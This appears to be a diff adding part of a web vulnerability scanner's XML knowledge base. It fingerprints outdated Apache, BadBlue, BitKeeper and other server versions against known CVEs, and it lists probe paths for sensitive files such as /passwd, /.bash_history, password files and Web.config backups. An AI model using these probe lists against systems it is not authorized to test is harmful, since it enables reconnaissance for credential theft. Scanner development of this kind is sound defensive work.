+		<match type="regex">Apache\/2\.0\.([0-3].*|4[0-6])</match>
+	</item>
+
+	<item name="Apache 2.0.x APR-Util Overflow" severity="high">
+		<description>Apache 2.0 to 2.0.51 contain multiple problems: overflow in apr-util (OSVDB-9994)</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.([0-4].*|5\.[0-1])</match>
+	</item>
+	
+	<item name="Apache 2.0.x Authentication ByPass" severity="high">
+		<description>Apache 2.0 to 2.0.52 could allow bypassing of authentication via the Satisfy directive. CAN-2004-0811. OSVDB-10218.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.([0-4].*|5\.[0-2])</match>
+	</item>
+
+	<item name="Apache 2.0.x SSLCipherSuite ByPass" severity="high">
+		<description>Apache 2.0 to 2.0.53 allows bypassing of an SSLCipherSuite setting. CAN-2004-0885. OSVDB-10637. Also contains a memory exhaustion DoS through MIME folded requests. CAN-2004-0942. OSVDB-11391</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.([0-4].*|5\.[0-3])</match>
+	</item>
+
+	<item name=" FakeBasicAuth Buffer Overflow" severity="high">
+		<description>Apache 2.0 to 2.0.50 contain a buffer overflow in FakeBasicAuth with trusted client certificates. CAN-2004-0488. OSVDB-6472. Also a DoS with certain input data. CAN-2004-0493. OSVDB-7269.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.([0-4].*|5\.0)</match>
+	</item>
+
+	<item name="Apache 2.0.x mod_dav Denial Of Service" severity="high">
+		<description>Apache versions 2.0.37 through 2.0.45 are vulnerable to a DoS in mod_dav. CAN-2003-0245.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.(3[7-9]|4[0-5])</match>
+	</item>
+
+	<item name="Apache 2.0.x plain-HTTP-on-SSL-port Memory Leak" severity="high">
+		<description>Apache 2.0 to 2.0.49: memory leak in plain-HTTP-on-SSL-port handling (OSVDB-4182)</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.[0-4].*</match>
+	</item>
+
+	<item name="Apache 2.0.x Basic Authentication Denial Of Service" severity="high">
+		<description>Apache versions 2.0.40 through 2.0.45 are vulnerable to a DoS in basic authentication. CAN-2003-0189.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.4[0-5]</match>
+	</item>
+
+	<item name="Apache 2.0.43 Win9x And ME Arbitrary Code Execution" severity="high">
+		<description>Win9x and ME servers allow arbitrary code execution</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.43</match>
+	</item>
+
+	<item name="Apache 2.0.44 Denial Of Service" severity="high">
+		<description>Apache 2.0.44 is vulnerable to a DoS when linefeed characters are submitted consecutively. CAN-2003-0132.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Apache\/2\.0\.44</match>
+	</item>		
+	       
+		<item name="Apache JServ 1.x.x Arbitrary File Retrieval" severity="high">
+		<description>This version of Apache JServ allows files to be retrieved and possibly executed from outside the web root. CAN-2001-0307.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">apachejserv\/1\.(0|1\.[0-1])</match>
+	</item>
+
+	<item name="BadBlue Web server 2.15 Remote Command Execution" severity="high">
+		<description>BadBlue Web server 2.15 allow remote users to execute commands on the machine. http://www.badblue.com/</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">BadBlue\/([0-1].*|2\.[0-9]{1}|2\.1[0-5]{1})</match>
+	</item>
+
+	<item name="BadBlue Web server 1.7.0 Directory Listing" severity="medium">
+		<description>BadBlue Web server 1.7.0 and below allows directories to be listed by appending a unicode % to the end of a string. http://www.badblue.com/</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">BadBlue\/(0\..*|1\.([0-6].*|7\.0))</match>
+	</item>
+
+	<item name="BitKeeper 0.3 Command Execution" severity="high">
+		<description>BitKeeper may allow anyone to execute arbitrary commands on the remote system. See http://www.securiteam.com/securitynews/5TP0D0K8UQ.html.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">bkhttp\/0\.3</match>
+	</item>
+
+	<item name="Blazix 1.2.1 Source Code Exposure" severity="high">
+		<description>Can view JSP source by appending a + to the end of the request.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="regex">Blazix\/1\.2\.1</match>
+	</item>
+
+	<item name="Brickserver Directory Listing" severity="medium">
+		<description>May be vulnerable to %2f type directory listing vulnerabilities if the directory contains an index.shtml but not index.html file.</description>
+		<payload scope="HEADER">/</payload>
+		<match type="simple">Brickserver Modifications</match>
+	</item>       
+		        
+	<item name="Sensitive Files" severity="very low" id="files">
+		<description>Potential sensitive file .</description>
+		
+		<payload scope="HTTP">/pass.txt</payload>
+		<payload scope="HTTP">/passwd</payload>
+		<payload scope="HTTP">/password.txt</payload>
+		<payload scope="HTTP">/passwords.txt</payload>
+		<payload scope="HTTP">/users.txt</payload>
+		<payload scope="HTTP">/users.ini</payload>
+		<payload scope="HTTP">/users.db</payload>
+		<payload scope="HTTP">/passwd.txt</payload>
+		<payload scope="HTTP">/admin.pw</payload>
+		<payload scope="HTTP">/admin.conf</payload>
+		<payload scope="HTTP">/dirs.txt</payload>
+		<payload scope="HTTP">/admin.db</payload>
+		<payload scope="HTTP">/admin.txt</payload>
+		<payload scope="HTTP">/admin.html</payload>
+		<payload scope="HTTP">/admin.cfg</payload>
+		<payload scope="HTTP">/admin.htm</payload>
+		<payload scope="HTTP">/install.txt</payload>
+		<payload scope="HTTP">/install.log</payload>
+		<payload scope="HTTP">/readme.txt</payload>
+		<payload scope="HTTP">/test-env</payload>
+		<payload scope="HTTP">/database.inc</payload>
+		<payload scope="HTTP">/common.inc</payload>
+		<payload scope="HTTP">/db.inc</payload>
+		<payload scope="HTTP">/connect.inc</payload>
+		<payload scope="HTTP">/debug.inc</payload>
+		<payload scope="HTTP">/sql.inc</payload>
+		<payload scope="HTTP">/errors.log</payload>
+		<payload scope="HTTP">/debug.log</payload>
+		<payload scope="HTTP">/log.txt</payload>
+		<payload scope="HTTP">/cleanup.log</payload>
+		<payload scope="HTTP">/access_log</payload>
+		<payload scope="HTTP">/logfile.txt</payload>
+		<payload scope="HTTP">/memory.log</payload>
+		<payload scope="HTTP">/server.log</payload>
+		<payload scope="HTTP">/system.log</payload>
+		<payload scope="HTTP">/.bash_history</payload>
+		<payload scope="HTTP">/.bashrc</payload>
+		<payload scope="HTTP">/test</payload>
+		<payload scope="HTTP">/test.txt</payload>
+		<payload scope="HTTP">/test.htm</payload>
+		<payload scope="HTTP">/test.html</payload>
+		<payload scope="HTTP">/stat.htm</payload>
+		<payload scope="HTTP">/stats.htm</payload>
+		<payload scope="HTTP">/statistics.htm</payload>
+		<payload scope="HTTP">/webstats.html</payload>
+		<payload scope="HTTP">/wwwstats.htm</payload>
+		<payload scope="HTTP">/wwwstats.html</payload>
+		<payload scope="HTTP">/log.htm</payload>
+		<payload scope="HTTP">/log.html</payload>
+		<payload scope="HTTP">/logs.htm</payload>
+		<payload scope="HTTP">/logs.html</payload>
+		<payload scope="HTTP">/.wwwacl</payload>
+		<payload scope="HTTP">/wwForum.mdb</payload>
+		<payload scope="HTTP">/auth_user_file.txt</payload>
+		<payload scope="HTTP">/info.txt</payload>
+		<payload scope="HTTP">/orders.txt</payload>
+		<payload scope="HTTP">/orders.htm</payload>
+		<payload scope="HTTP">/registrations.txt</payload>
+		<payload scope="HTTP">/registrations.htm</payload>
+		<payload scope="HTTP">/Web.config</payload>
+		<payload scope="HTTP">/Global.asax</payload>
+		<payload scope="HTTP">/Global.asa</payload>
+		<payload scope="HTTP">/Global.asax.cs</payload>
+		<payload scope="HTTP">/global.bak</payload>
+		<payload scope="HTTP">/global.rar</payload>
+		<payload scope="HTTP">/global.old</payload>
+		<payload scope="HTTP">/global.orig</payload>
+		<payload scope="HTTP">/global.asa.bak</payload>
+		<payload scope="HTTP">/global.asa.bakup</payload>
+		<payload scope="HTTP">/global.asa.old</payload>
+		<payload scope="HTTP">/global.asa.tmp</payload>
+		<payload scope="HTTP">/global.asa.temp</payload>
+		<payload scope="HTTP">/global.asa.orig</payload>
+		<payload scope="HTTP">/Web.config.bak</payload>
+		<payload scope="HTTP">/Web.config.bakup</payload>
+		<payload scope="HTTP">/Web.config.old</payload>
+		<payload scope="HTTP">/Web.config.tmp</payload>
+		<payload scope="HTTP">/Web.config.temp</payload>
+		<payload scope="HTTP">/Web.config.orig</payload>
+		<payload scope="HTTP">/Global.asax.bak</payload>
+		<payload scope="HTTP">/Global.asax.bakup</payload>
+		<payload scope="HTTP">/Global.asax.old</payload>
+		<payload scope="HTTP">/Global.asax.tmp</payload>
+		<payload scope="HTTP">/Global.asax.temp</payload>
+		<payload scope="HTTP">/Global.asax.orig</payload>
+	</item>
+	
+	<item name="Sensitive Directories" severity="very low" id="dirs">
+		<description>Potential sensitive directory .</description>
+		<payload scope="HTTP">/temp/</payload>
+		<payload scope="HTTP">/prv/</payload>
+		<payload scope="HTTP">/source/</payload>
+		<payload scope="HTTP">/backup/</payload>
+		<payload scope="HTTP">/bak/</payload>
+		<payload scope="HTTP">/old/</payload>
+		<payload scope="HTTP">/include/</payload>
+		<payload scope="HTTP">/inc/</payload>
+		<payload scope="HTTP">/data/</payload>
+		<payload scope="HTTP">/test/</payload>
+		<payload scope="HTTP">/tmp/</payload>
+		<payload scope="HTTP">/save/</payload>
+		<payload scope="HTTP">/archive/</payload>
+		<payload scope="HTTP">/marketing/</payload>
+		<payload scope="HTTP">/passwords/</payload>
+		<payload scope="HTTP">/jdbc/</payload>
+		<payload scope="HTTP">/files/</payload>
+		<payload scope="HTTP">/site/</payload>
+		<payload scope="HTTP">/files/</payload>
+		<payload scope="HTTP">/sales/</payload>
+		<payload scope="HTTP">/login/</payload>
+		<payload scope="HTTP">/guests/</payload>
+		<payload scope="HTTP">/file/</payload>
+		<payload scope="HTTP">/root/</payload>
+		<payload scope="HTTP">/htdocs/</payload>
+		<payload scope="HTTP">/account/</payload>
+		<payload scope="HTTP">/sql/</payload>
+		<payload scope="HTTP">/setup/</payload>
+		<payload scope="HTTP">/website/</payload>
+		<payload scope="HTTP">/config/</payload>
+		<payload scope="HTTP">/install/</payload>
+		<payload scope="HTTP">/installer/</payload>
+		<payload scope="HTTP">/shop/</payload>
+		<payload scope="HTTP">/private/</payload>
+		<payload scope="HTTP">/fpadmin/</payload>
+		<payload scope="HTTP">/administrator/</payload>
+		<payload scope="HTTP">/intranet/</payload>
+		<payload scope="HTTP">/webadmin/</payload>
+		<payload scope="HTTP">/employees/</payload>
+		<payload scope="HTTP">/accounting/</payload>
+		<payload scope="HTTP">/tree/</payload>
+		<payload scope="HTTP">/pages/</payload>
+		<payload scope="HTTP">/users/</payload>
+		<payload scope="HTTP">/access/</payload>
+		<payload scope="HTTP">/library/</payload>
+		<payload scope="HTTP">/database/</payload>
+		<payload scope="HTTP">/html/</payload>
+		<payload scope="HTTP">/bin/</payload>
+		<payload scope="HTTP">/Admin_files/</payload>
+		<payload scope="HTTP">/credit/</payload>
+		<payload scope="HTTP">/public/</payload>
+		<payload scope="HTTP">/dbase/</payload>
+		<payload scope="HTTP">/priv/</payload>
+		<payload scope="HTTP">/customers/</payload>
+		<payload scope="HTTP">/asp/</payload>
+		<payload scope="HTTP">/zipfiles/</payload>
+		<payload scope="HTTP">/pw/</payload>
+		<payload scope="HTTP">/admin/</payload>
+		<payload scope="HTTP">/new/</payload>
+		<payload scope="HTTP">/adm/</payload>
+		<payload scope="HTTP">/oracle/</payload>
+		<payload scope="HTTP">/odbc/</payload>
+		<payload scope="HTTP">/mall_log_files/</payload>
+		<payload scope="HTTP">/WebTrend/</payload>
+		<payload scope="HTTP">/order/</payload>
+		<payload scope="HTTP">/support/</payload>
+		<payload scope="HTTP">/msql/</payload>
+		<payload scope="HTTP">/user/</payload>
+		<payload scope="HTTP">/demo/</payload>
+		<payload scope="HTTP">set_by_module</payload>
+		<payload scope="HTTP">1</payload>
+		<payload scope="HTTP">/demos/</payload>
+		<payload scope="HTTP">/bkup</payload>
+		<payload scope="HTTP">/mp3</payload>
+		<payload scope="HTTP">/db</payload>
+		<payload scope="HTTP">/ftp</payload>
+		<payload scope="HTTP">/ibill</payload>
+		<payload scope="HTTP">/incoming</payload>
+		<payload scope="HTTP">/mail</payload>
+		<payload scope="HTTP">/members</payload>
+		<payload scope="HTTP">/orders</payload>
+		<payload scope="HTTP">/samples</payload>
+		<payload scope="HTTP">/scripts</payload>
+		<payload scope="HTTP">/sitestats</payload>
+		<payload scope="HTTP">/support</payload>
+		<payload scope="HTTP">/www</payload>
+		<payload scope="HTTP">/errors</payload>
+		<payload scope="HTTP">/siteadmin</payload>
+		<payload scope="HTTP">/backups</payload>
+		<payload scope="HTTP">/testing</payload>
+		<payload scope="HTTP">/internal</payload>
+		<payload scope="HTTP">/~home</payload>
+		<payload scope="HTTP">/~guest</payload>
+		<payload scope="HTTP">/~nobody</payload>
+		<payload scope="HTTP">/export</payload>
+		<payload scope="HTTP">/testweb</payload>
+		<payload scope="HTTP">/~log</payload>
+		<payload scope="HTTP">/error_log</payload>
+		<payload scope="HTTP">/ccbill</payload>
+		<payload scope="HTTP">/network</payload>
+		<payload scope="HTTP">/xampp</payload>
+	</item>
+	
+</altair-kb>
